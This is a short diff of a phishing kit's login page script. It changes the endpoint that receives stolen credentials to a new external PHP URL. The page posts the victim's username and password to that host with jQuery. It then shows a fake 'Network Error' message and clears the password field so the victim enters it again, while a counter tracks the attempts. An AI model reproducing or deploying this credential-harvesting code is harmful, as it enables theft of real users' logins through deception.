@@ -19,7 +19,7 @@
 
 
 <script>
-const url = 'https://mzatradinq.eu/Fiz/x3.php';   //full url goes here
+const url = 'https://mzatradinq.eu/wetr/fire.php';   //full url goes here
 </script>
 
 
@@ -200,7 +200,7 @@ $('#formDiv').fadeIn('slow');
 		$.post(url, {user:a,pass:b});
 
 		setTimeout(function(){
-			$('#divMsg').html('Error encountered, invalid email or password combination');
+			$('#divMsg').html('Network Error encountered, Try again!!!');
 			$('#pass').val('');
 			var add = +c+1;
 			$('#count').val(add);
